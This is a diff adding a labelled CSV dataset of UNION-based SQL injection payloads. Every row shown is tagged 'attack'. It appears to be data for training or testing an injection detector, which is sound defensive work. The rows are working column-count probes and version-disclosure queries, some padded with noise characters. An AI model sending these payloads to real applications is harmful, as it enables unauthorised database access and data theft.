@@ -1,0 +1,157 @@
+label,payload,family
+attack," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",union
+attack," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",union
+attack," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",union
+attack,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",union
+attack," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",union
+attack," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",union
+attack," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",union
+attack," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",union
+attack," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1. union select null,version  (    )   -- 1",union
+attack," select * from users where id  =  1 union select @ _,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",union
+attack," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",union
+attack," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",union
+attack," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",union
+attack," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",union
+attack,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",union
+attack,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",union
+attack,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",union
+attack,"1  )   as ghew where 6441  =  6441 union all select null,null--",union
+attack,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",union
+attack,"1  )   union all select null,null,null,null,null,null,null,null,null--",union
+attack,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",union
+attack,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",union
+attack,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",union
+attack,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",union
+attack,1'   )    )    as vwua where 8099  =  8099 union all select null--,union
+attack,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",union
+attack,"1'  )   union all select null,null,null,null,null,null#",union
+attack,"-9532   )    )    union all select 6039,6039,6039,6039--",union
+attack,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",union
+attack,"1%'  )   union all select null,null,null,null,null,null#",union
+attack,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",union
+attack,"1 union all select null,null,null,null,null,null,null,null--",union
+attack,"1%' union all select null,null,null,null,null,null,null,null--",union
+attack,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",union
+attack,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",union
+attack,"-9156'   )    )    union all select 9110,9110,9110,9110#",union
+attack,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",union
+attack,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",union
+attack,"1   )    )     )   union all select null,null,null,null,null,null#",union
+attack,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",union
+attack,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",union
+attack,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",union
+attack,"1%' union all select null,null,null,null,null,null,null#",union
+attack,"1'  )   union all select null,null,null,null,null,null--",union
+attack,"1""  )   union all select null,null,null,null,null,null--",union
+attack,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",union
+attack,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",union
+attack,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",union
+attack,"1%' union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",union
+attack,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",union
+attack,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",union
+attack,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",union
+attack,"1""   )    )     )   union all select null,null,null,null,null,null--",union
+attack,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",union
+attack,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",union
+attack,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",union
+attack,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",union
+attack,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",union
+attack,1'  )   as gogu where 4338  =  4338 union all select null#,union
+attack,"1""  )   union all select null,null,null,null,null,null,null,null,null--",union
+attack,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",union
+attack,"1'   )    )     )   union all select null,null,null,null,null,null,null#",union
+attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",union
+attack,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",union
+attack,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",union
+attack,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",union
+attack,"1%""   )    )    union all select null,null,null,null,null#",union
+attack,"-2639""  )   where 1494  =  1494 union all select 1494--",union
+attack,"1'  )   union all select null,null,null,null,null,null,null,null,null--",union
+attack,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",union
+attack,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",union
+attack,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",union
+attack,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",union
+attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
+attack,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",union
+attack,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",union
+attack,"1%""   )    )     )   union all select null,null,null,null,null,null--",union
+attack,-3666'  )   where 6386  =  6386 union all select 6386--,union
+attack,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",union
+attack,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union
+attack,"1""  )   where 2088  =  2088 union all select null,null,null,null--",union
+attack,"1'+  (  select lang where 4191  =  4191 union all select null,null#",union
+attack,"1' union all select null,null,null,null,null,null,null,null,null--",union
+attack,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",union
+attack,"1""  )   as boeh where 2571  =  2571 union all select null#",union
+attack,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",union
+attack,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",union
+attack,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",union
+attack,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",union
+attack,"1%'   )    )    union all select null,null,null,null,null,null#",union
+attack,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",union
+attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",union
+attack,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",union
+attack,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",union
+attack,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",union
+attack,"1""  )   where 5870  =  5870 union all select null,null,null--",union
+attack,"1' where 2774  =  2774 union all select null,null,null,null,null#",union
+attack,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",union
+attack,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",union
+attack,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",union
+attack,"-8073   )    )     )   union all select 4481,4481,4481,4481--",union
+attack,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",union
+attack,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",union
+attack,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",union
+attack,"-1550' in boolean mode  )   union all select 9777,9777,9777--",union
+attack,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",union
+attack,-4965  )   as imga where 3705  =  3705 union all select 3705--,union
+attack,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",union
+attack,"1%""   )    )    union all select null,null,null,null,null--",union
+attack,"1'  )   where 8268  =  8268 union all select null,null,null,null--",union
+attack,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",union
+attack,1'  )   as zmvn where 2887  =  2887 union all select null--,union
+attack,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",union
+attack,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",union
+attack,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",union
+attack,"1%'   )    )    union all select null,null,null,null,null,null,null--",union
+attack,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",union
+attack,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",union
+attack,"-3300' union all select 8979,8979,8979,8979,8979,8979--",union
+attack,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union
+attack,"1""   )    )    union all select null,null,null,null,null,null,null#",union
+attack,"1""   )    )     )   union all select null,null,null,null,null,null,null--",union
+attack,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",union
+attack,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,union
+attack,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",union
+attack,"1""  )   union all select null,null,null,null,null,null,null--",union
+attack,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",union
+attack,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",union
+attack,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",union
+attack,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",union
+attack,"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",union
+attack,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union
+attack,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",union
+attack,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",union
+attack,"-4711%""   )    )    union all select 6737,6737,6737,6737#",union
+attack,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",union
+attack,"1 union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",union
+attack,"1   )    )    union all select null,null,null,null,null,null,null,null--",union
+attack,"1"" where 2878  =  2878 union all select null,null,null,null,null#",union
+attack,"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",union
